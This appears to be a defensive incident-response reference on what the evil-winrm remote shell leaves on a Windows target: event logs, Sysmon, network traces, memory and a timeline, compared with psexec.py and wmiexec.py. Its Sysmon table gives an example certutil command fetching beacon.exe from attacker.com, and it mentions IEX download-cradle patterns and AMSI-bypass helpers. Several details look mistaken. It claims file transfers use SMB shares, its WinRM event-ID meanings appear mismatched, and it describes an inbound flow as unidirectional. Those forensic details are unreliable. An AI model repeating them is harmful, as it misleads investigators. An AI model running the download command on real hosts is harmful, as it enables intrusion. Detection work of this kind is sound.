# evil-winrm — Target Evidence

Evidence left on the **target/destination** host. evil-winrm's fingerprint is **session-based and event-log centric** — a persistent WinRM session generates a continuous chain of event-log entries that strongly distinguish it from one-off command-execution tools like `psexec.py` or `wmiexec.py`.

## Contents
- [Filesystem](#filesystem)
- [Registry](#registry)
- [Windows Event Logs](#windows-event-logs)
- [Sysmon (if deployed)](#sysmon-if-deployed)
- [WinRM Protocol Detail](#winrm-protocol-detail)
- [Network-Layer Evidence](#network-layer-evidence)
- [PowerShell Logs](#powershell-logs)
- [Endpoint Security Product Signatures](#endpoint-security-product-signatures)
- [Memory Forensics](#memory-forensics)
- [Contrast with psexec.py / wmiexec.py](#contrast-with-psexecpy--wmiexecpy)
- [Building a Timeline](#building-a-timeline)

---

## Filesystem

| Artifact | Detail |
|---|---|
| **Dropped files** (from `upload` command) | Only files explicitly uploaded via the `upload` command land on disk. Their locations depend entirely on what path the operator specified; common destinations: `C:\Windows\Temp\`, `C:\Users\<user>\Downloads\`, or `C:\Temp\`. No default evil-winrm drop location. |
| **No service binary dropped** | Unlike `psexec.py`, evil-winrm does not drop a RemCom/service executable — the tool runs entirely through the WinRM service and PowerShell runspace (both already on the target), so there is **no unique binary artifact** to find via hash or filename search. |
| **Session logs** | If the operator saved files during the session (e.g., via `download` or `upload`), their paths remain in the WinRM logs (see below). No `.log` file is created on the target unless the operator explicitly created one inside the PowerShell session (e.g., `$cmdoutput | Out-File C:\Temp\output.txt`). |
| **Prefetch** | `PowerShell.exe-<HASH>.pf` (or `PwshCore.exe-...pf` if using PowerShell 7+). The prefetch file itself is **not distinctive** — PowerShell is ubiquitous on Windows — but if prefetch analysis shows a never-before-seen PowerShell execution at a specific time, correlated with WinRM event logs from the same timestamp, it strengthens the timeline. |
| **Amcache** | Records of `PowerShell.exe` or `PwshCore.exe` execution; again, common and low-specificity unless temporally correlated with WinRM session logs. |

## Registry

| Hive | Key | Detail |
|---|---|---|
| **HKEY_LOCAL_MACHINE** | `SYSTEM\CurrentControlSet\Services\WinRM` | The WinRM service registration — unchanged by evil-winrm. Confirms WinRM is installed and was the mechanism used. |
| HKEY_LOCAL_MACHINE | `SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon` | No changes — evil-winrm does not modify logon settings. |
| HKEY_LOCAL_MACHINE | `SYSTEM\CurrentControlSet\Control\Lsa` | No changes — evil-winrm does not disable LSA protections or audit settings at runtime (though running `Bypass-4MSI` does patch `amsi.dll` in memory, not registry). |
| **HKEY_CURRENT_USER** (of the authenticated user) | `Software\Microsoft\Windows\CurrentVersion\Run` | No changes — evil-winrm does not create autorun entries. |
| HKEY_CURRENT_USER | `Software\Microsoft\Windows\Shell\BagsMRU` | May show MRU for files accessed during the session if the operator browsed the file system via `Get-ChildItem` (indirectly recorded via shell namespace explorer). Low confidence; not distinctive. |

**Summary:** evil-winrm leaves **no registry artifacts of its own**. The session runs entirely through the WinRM service and PowerShell runspace, both of which operate through event logs rather than registry modifications.

## Windows Event Logs

This is where evil-winrm's signature is strongest. The security and WinRM event logs capture a **continuous session chain** that is distinctive and difficult to spoof or hide.

### Security Event Log (HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\EventLog\Security)

| Event ID | Name | Signal | Frequency |
|---|---|---|---|
| **4624** | Logon | A logon event (Type 3 — Network logon) for the authenticated user. **Timestamp: start of the WinRM session.** AuthenticationPackage is `Negotiate` (which internally selects NTLM or Kerberos) or explicitly `NTLM` or `Kerberos`. | **One per session** (not per command) — evil-winrm establishes a single session with one 4624 at the start, then reuses that session for all subsequent commands. This is the key distinction from `psexec.py` (one 4624 per command invocation). |
| **4672** | Special Privileges Assigned | Logs if the authenticating user has special privileges (e.g., admin-equivalent, SeDebugPrivilege). Presence confirms an elevated session; absence does not rule it out (unprivileged sessions still run fine). | Zero or one per session, depending on user's rights. |
| **4720** | User Account Created | Only if the commands executed create a new user (rare, explicit action). | Zero events unless the operator explicitly creates a user. |
| **4688** | Process Creation | PowerShell command execution. If command-line auditing is enabled (`AuditProcessCommandLine` registry setting or Group Policy), the full command line is logged. Example: `C:\Windows\System32\powershell.exe -Command "whoami /all"` (the command is the one typed at the `*Evil-WinRM*>` prompt). | **One per command executed inside the runspace**, not per connection — if the operator types 5 commands in one evil-winrm session, there are 5 Process Creation events (one per command), but **only 1** Logon event (4624) at the session start. |
| **4689** | Process Termination | End of the PowerShell process (or child process launched by it). | One per spawned process; if the operator runs `whoami`, a child `whoami.exe` process is spawned, creates a 4688 and a 4689. |
| **5140** | Network Share Object Accessed | If the operator uses `upload`/`download` commands, they rely on SMB file shares (ADMIN$, C$, or a custom share). This event fires for the SMB tree-connect. | One or more per file transfer operation. |
| **5145** | Detailed Share-File Access (if auditing enabled) | If object-access auditing is enabled at a granular level, shows the exact file being read/written during an `upload`/`download` operation. | Depends on audit policy. |

### WinRM Event Log (Microsoft-Windows-WinRM/Operational)

This is the **most distinctive** log for evil-winrm, as it is WinRM-specific and captures the session lifecycle.

| Event ID | Name | Signal | Frequency |
|---|---|---|---|
| **6** | WSManCreate | The WinRM service begins to create a shell session. **Timestamp: very start of the WinRM connection**, typically 1–2 milliseconds after the TCP SYN. | **One per evil-winrm session** — this is the session-start marker. |
| **8** | WSManReceiveResponseComplete | The WinRM service receives (or completes sending) a response for a command/operation. Provides operational granularity. | Multiple per session (one or more per command executed), but may be aggregated or filtered depending on audit settings. |
| **15** | WSManCreateShell | A PowerShell shell has been successfully created and is ready for command input. **This marks the runspace creation.** | **One per evil-winrm session** — the runspace persists across multiple commands. This is the key distinction from single-command tools. |
| **33** | WSManOperationCommand | A command is being executed inside the shell. | **One per command** typed at the `*Evil-WinRM*>` prompt. The command itself (e.g., `whoami`) is **not** logged in Event 33; the event just marks that a command operation began. Full command content requires Sysmon 1 or PowerShell Script Block Logging. |
| **91** | WSManCloseShell | The shell/runspace is being closed (operator disconnected or session timed out). **Timestamp: end of the evil-winrm session.** | **One per session**, marking the session termination. A long-running session has Event 15 (create) early, then many Event 33 (commands), then Event 91 (close) much later. |

### PowerShell Event Log (Microsoft-Windows-PowerShell/Operational)

If PowerShell Script Block Logging (POSH auditing) is enabled (requires Group Policy: "Turn on PowerShell Script Block Logging"), this log captures script content.

| Event ID | Name | Signal |
|---|---|---|
| **4104** | Script Block Create | The full PowerShell command text is logged. For evil-winrm sessions, this captures every PowerShell command executed inside the runspace: `whoami /all`, `Get-Process`, `IEX (New-Object...)`, etc. This is the **richest source of operator intent** — often captures the exact commands the operator typed. |
| **8209** | PowerShell Concurrent Pipeline Execution Details | High-volume operational logging; less critical than 4104 for identifying evil-winrm usage. |

If PowerShell Script Block Logging is **disabled** (the default), Event 4104 is not generated. In this case, recovery of command text depends on Sysmon 1 (if deployed), or the persistence of command history in the `PowerShell_ISE_History.txt` or analogous files (low confidence, depends on shell type).

### System Event Log (System)

| Event ID | Name | Signal |
|---|---|---|
| **7045** | A new service was installed | **Only if the operator explicitly installed a service** via PowerShell or `sc.exe` inside the evil-winrm shell. Not created by evil-winrm itself. |

## Sysmon (if deployed)

Sysmon event logs on a modern Windows system provide the most detailed, real-time operational evidence.

| Event ID | Signal | Detail |
|---|---|---|
| **1** (Process Create) | PowerShell spawning a child process | If the operator types a command that spawns a child process (e.g., `whoami`, `tasklist`, `cmd.exe /c ...`), Sysmon logs the parent-child relationship: **PowerShell.exe (parent) → whoami.exe (child)**. The **full command line** is captured if command-line auditing is enabled; otherwise, just the binary name. This is the direct evidence of what command was actually executed. |
| **3** (Network Connect) | Outbound connection from the target | If the operator uses the evil-winrm shell to launch a tool that makes an external connection (e.g., `certutil -urlcache -f http://attacker.com/beacon.exe C:\Temp\beacon.exe`), Sysmon logs the outbound network connection. The **source port** is pseudo-random (depends on the child process), and the **destination** is the external host. |
| **7** (Image Loaded) | PowerShell.exe loading unexpected DLLs | If the operator uses `Invoke-Binary` or `Dll-Loader` to load a .NET assembly or DLL in-memory, Sysmon may log the loaded image. This is less reliable than Sysmon 1 (which always fires for spawned processes) but can catch in-memory loading. Example: loading `mimilib.dll` into PowerShell.exe would show a Sysmon 7 for that DLL. |
| **8** (CreateRemoteThread) | Thread injection | If the operator uses `Donut-Loader` or other injection techniques inside the PowerShell runspace, Sysmon may log cross-process thread creation. However, evil-winrm's default helpers (`Invoke-Binary`, `Dll-Loader`) execute in-process (inside PowerShell itself), so Sysmon 8 is **not expected** for the default case. |
| **11** (FileCreate) | Files created | If the operator uses `upload` or executes a command that creates a file (e.g., `whoami | Out-File C:\temp\output.txt`), Sysmon logs the file creation. The full path and timestamp are captured. |
| **22** (DNSQuery) | DNS requests | If the operator uses a command that resolves a domain name (e.g., `[System.Net.Dns]::GetHostByName('attacker.com')`), Sysmon logs the DNS query. |

## WinRM Protocol Detail

WinRM communication uses the **PSRP (PowerShell Remoting Protocol)** wrapped in **HTTP/S**. The protocol sequence is:

```
Attacker (evil-winrm)                  Target (Windows, port 5985/5986)
──────────────────────────────────────────────────────────────────────
1. TCP SYN to :5985 (or :5986 if -S)  ──▶  WinRM service accepts connection
2. HTTP POST /wsman (default path)
   [PSRP SOAP request for shell create] ──▶  WinRM creates runspace
3. ◀── HTTP 200 OK [PSRP SOAP response] ───── Runspace handle returned
   (WinRM Event 15: Shell created)

4. HTTP POST /wsman
   [PSRP SOAP command payload: "whoami"]    ──▶  Command queued in runspace
5. ◀── HTTP 200 OK [PSRP response output]  ───── Runspace executes,
   (WinRM Event 33: Command executed)           returns output

6. [Repeat 4–5 for each subsequent command]

7. HTTP POST /wsman
   [PSRP SOAP shell close request]        ──▶  Close runspace
8. ◀── HTTP 200 OK                       ───── Session terminated
   (WinRM Event 91: Shell closed)
```

Each HTTP request/response pair contains SOAP-wrapped PSRP protocol elements, base64-encoded and compressed. Zeek or Suricata NDR can decode this at the protocol level to extract the command text and output.

## Network-Layer Evidence

| Source | What It Shows |
|---|---|
| **Firewall logs** | Inbound TCP connection from the attacker's IP to the target on port 5985 (HTTP) or 5986 (HTTPS). The connection is **single, persistent** for the duration of the evil-winrm session, then closes. A long-running session shows one inbound connection lasting many minutes/hours, not many short bursts. |
| **Zeek HTTP logs** | If HTTP (5985) is used, Zeek's `http.log` captures HTTP POST requests to `/wsman` with `Content-Type: application/soap+xml`. Response codes are consistently 200 (OK). The logs show rapid request/response pairs (one per command executed). HTTPS (5986) traffic is encrypted, so the HTTP payload is not visible, only the TCP-level connection pattern. |
| **Zeek DCE-RPC logs** | WinRM operates over HTTP, not raw DCE/RPC, so traditional RPC event logging is **not applicable** here. (This is a key difference from `wmiexec.py`, which uses DCE/RPC over TCP 135/dynamic, leaving RPC endpoint-mapper signatures.) |
| **NetFlow / sflow** | Shows a unidirectional (inbound) TCP flow from the attacker's external IP to the target on port 5985 or 5986. The flow duration equals the evil-winrm session duration. Packet count and byte count vary with command volume and output size. Long-running sessions show high packet counts relative to one-off tools. |
| **SSL/TLS handshake** (if using HTTPS, port 5986) | The TLS certificate presented by the target's WinRM service is logged. This certificate is typically the server's own self-signed cert (for default WinRM) or a domain-joined certificate. JA3/JA3S fingerprinting can identify that this is a Windows WinRM service. |

## PowerShell Logs

Beyond the Security event log's PowerShell-related events (4688, etc.), the target machine may have local PowerShell history files:

| File | Path | Detail |
|---|---|---|
| **PowerShell history** | `C:\Users\<user>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt` | Records commands typed in interactive PowerShell sessions. If evil-winrm connects and the operator types commands, **those commands are NOT recorded in this file** — the file only captures the local interactive shell, not remote sessions. This file is **not evidence of evil-winrm usage** but is often checked defensively anyway. |
| **PowerShell Operational event log** | `%SystemRoot%\System32\winevt\Logs\Microsoft-Windows-PowerShell%4Operational.evtx` | If PowerShell Script Block Logging is enabled (Group Policy: `Computer Config > Policies > Windows Components > Windows PowerShell > Turn on PowerShell Script Block Logging`), Event 4104 logs the full command text. This **is** evidence of evil-winrm commands, as they execute in the remote runspace. |

## Endpoint Security Product Signatures

Because evil-winrm runs through the WinRM service and PowerShell (both legitimately installed and commonly used), **file-hash-based detection is ineffective** (no distinctive binary to hash). Detection depends on behavioral heuristics:

| Product Category | What It Sees |
|---|---|
| **Windows Defender for Endpoint (Defender ATP)** | Detects WinRM-based lateral movement as a **Lateral Movement** risk if the connection pattern is anomalous (non-admin authenticating via WinRM, or WinRM from an unusual source IP). May also flag in-memory DLL loading (Dll-Loader, Invoke-Binary) as suspicious process injection/reflective loading. |
| **EDR agents (CrowdStrike, SentinelOne, etc.)** | May flag the PSRP/HTTP traffic as unusual for the host's baseline, or detect in-memory code execution (if Dll-Loader or Invoke-Binary is used). Behavioral heuristics around PowerShell spawning child processes (e.g., `whoami.exe` from `powershell.exe`) can trigger alerts. |
| **Network-based detection (Zeek, Suricata, NetWitness)** | Can decode PSRP/SOAP payloads in HTTP (not HTTPS) to extract command text and match against known-bad patterns or ATT&CK TTP signatures. Example: a Zeek rule detecting `POST /wsman` + base64-encoded PowerShell `IEX (New-Object Net.WebClient)...` payload. |
| **Antivirus** | Standard AV (Windows Defender, Norton, etc.) has limited visibility here because evil-winrm doesn't drop a distinctive binary. If AMSI is enabled and not bypassed, malicious commands may be caught at the PowerShell execution stage. `Bypass-4MSI` can evade this specific detection. |

## Memory Forensics

| Observable | Detail |
|---|---|
| **PowerShell.exe process** | If the target's memory is captured live, the `PowerShell.exe` process's heap and stack may contain: command text (before and after execution), output from commands, and handles to network sockets used by the WinRM session. Disk dumps of memory can be analyzed with `volatility3` or similar frameworks to recover command artifacts. |
| **WinRM service process (svchost.exe -k WinRM)** | The WinRM service process may hold references to the PSRP protocol state, authentication tokens, and connection handles. Live memory analysis can correlate the attacker's IP to the session handle. |
| **Injected code / in-memory assemblies** | If the operator used `Invoke-Binary` or `Dll-Loader`, the .NET assembly or DLL is loaded into PowerShell's memory. Memory forensics can extract the loaded binary (if still in memory) and analyze it for malicious intent. Tools like `yara` can scan memory for known malware signatures. |

## Contrast with psexec.py / wmiexec.py

The **defining difference** for evil-winrm is the **persistent runspace / session-based model**:

| Feature | psexec.py | wmiexec.py | evil-winrm |
|---|---|---|---|
| **Execution model** | Create service, drop binary, start service, spawn process, pipe I/O, delete service (per command) | Call Win32_Process.Create() (per command) | Create runspace, reuse for multiple commands, close runspace once |
| **Event 7045 (Service Install)** | One per invocation, with random service name | None (no service created) | None (no service created) |
| **Event 4624 (Logon)** | One per command invocation | One per invocation | One per session (multiple commands) — **key distinction** |
| **WinRM Operational Events 6/15/33/91** | None (doesn't use WinRM) | None (doesn't use WinRM) | Yes, full lifecycle (6→15→[33]*N→91) — **WinRM-specific trail** |
| **Security 4688 (Process Create)** | Multiple: one for service creation, one per spawned command process | One per command (WmiPrvSE.exe parent) | Multiple: one per spawned child process, but all within the same runspace session |
| **Execution context** | SYSTEM (service context) | Authenticating user (non-elevated by default) | Authenticating user (non-elevated by default) — same as wmiexec |
| **Persistence of session state** | None — each invocation is independent | None — each invocation is independent | Full — variables, functions, state persist across commands in the runspace |
| **Forensic signal strength** | Very strong (service creation is noisy, event 7045 is distinctive) | Strong (WMI-Activity 5857 is distinctive) | Strong (WinRM Operational events 15 + 91 + persistent session span is distinctive) |

## Building a Timeline

The tightest, highest-confidence timeline for evil-winrm:

1. **T0: Connection initiation (±1 second)**
   - Firewall inbound rule logged (TCP :5985 or :5986 from attacker IP)
   - WinRM Event 6 (WSManCreate)
   - WinRM Event 15 (WSManCreateShell) — **marks runspace creation, session start**
   - Security Event 4624 (Type 3 — Network Logon) — **timestamp should align with Events 6/15**

2. **T1 to T(N-1): Command execution loop (variable duration, seconds to hours)**
   - WinRM Event 33 (WSManOperationCommand) — marks each command invocation
   - Sysmon Event 1 (Process Create) if a child process is spawned — **exact command line if auditing enabled**
   - Security Event 4688 (Process Create) — captures the same child process, redundantly
   - WinRM Event 8 (WSManReceiveResponseComplete) — optional, marks response completion
   - [Repeat this sequence for each command]

3. **TN: Session termination (±1 second)**
   - WinRM Event 91 (WSManCloseShell) — **marks runspace destruction, session end**
   - Firewall outbound connection closes (final packet logged)
   - Any child processes spawned during the session terminate (Sysmon 5 / Security 4689)

**Example:** A 10-command evil-winrm session lasting 5 minutes shows:
- 1 Security 4624 at T0
- 1 WinRM Event 6 at T0 (within 1 sec)
- 1 WinRM Event 15 at T0 (within 5 sec)
- 10 WinRM Event 33 entries spread between T0 and T5min
- 10 Sysmon 1 entries (if child processes were spawned)
- 1 WinRM Event 91 at T5min

This **continuous chain** (single logon, single session create, multiple command operations, single session close) is the **strongest fingerprint for evil-winrm** and is very difficult to spoof with other tools.

